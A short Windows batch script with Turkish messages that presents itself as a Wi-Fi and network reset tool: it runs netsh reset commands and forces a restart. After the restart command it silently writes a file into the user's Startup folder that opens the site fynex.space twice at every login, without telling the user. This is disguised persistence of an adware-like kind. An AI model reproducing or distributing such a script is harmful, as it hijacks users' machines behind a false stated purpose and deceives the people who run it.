@echo off
echo Wi-Fi ve ağ ayarlari sifirlaniyor...
netsh wlan reset
netsh int ip reset
echo Sifirlama tamamlandi. Bilgisayar 10 saniye icinde yeniden baslatilacak...
timeout /t 10 /nobreak >nul
shutdown /r /t 0


echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\open_sites.bat"
echo start "" "https://www.fynex.space/" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\open_sites.bat"
echo start "" "https://www.fynex.space/" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\open_sites.bat"
